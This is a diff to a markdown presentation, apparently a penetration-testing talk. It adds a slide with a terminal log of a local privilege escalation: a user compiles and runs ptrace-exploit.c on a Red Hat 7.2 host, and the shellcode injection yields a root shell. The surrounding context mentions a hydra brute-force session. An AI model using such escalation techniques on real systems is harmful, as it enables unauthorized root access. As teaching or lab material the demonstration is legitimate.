@@ -198,7 +198,31 @@ The session file ./hydra.restore was written. Type "hydra -R" to resume session.
 						<img src="./img/ns-login.png" width=400></img>
 
 						GET ROOT AUTHORIZATION  
-						OF WEB SERVER BY TRACE
+						OF WEB SERVER BY "PTRACE"
+
+						>>>
+						## Ptrace log
+						- - -
+						```
+# whoami
+a
+
+[a@redhat72 a]$ cd ..
+[a@redhat72 home]$ cd a
+[a@redhat72 a]$ ls
+guess-who-0.44-nw3.tar.gz  ptrace-exploit.c
+[a@redhat72 a]$ gcc ptrace-exploit.c
+[a@redhat72 a]$ ./a.out
+[+] Attached to 855
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x40011aed
+[+] Now wait for suid shell...
+sh-2.05# whoami
+root
+						```
+
+
 						---
 						## The END
 
